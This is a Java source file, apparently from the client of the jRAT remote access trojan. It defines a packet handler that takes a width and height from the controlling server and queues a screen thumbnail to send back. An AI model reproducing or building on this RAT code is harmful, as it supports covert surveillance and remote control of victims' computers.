package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet33Thumbnail;

public class Packet40Thumbnail extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int width = con.readInt();
		int height = con.readInt();
		
		con.addToSendQueue(new Packet33Thumbnail(width, height));
	}

}
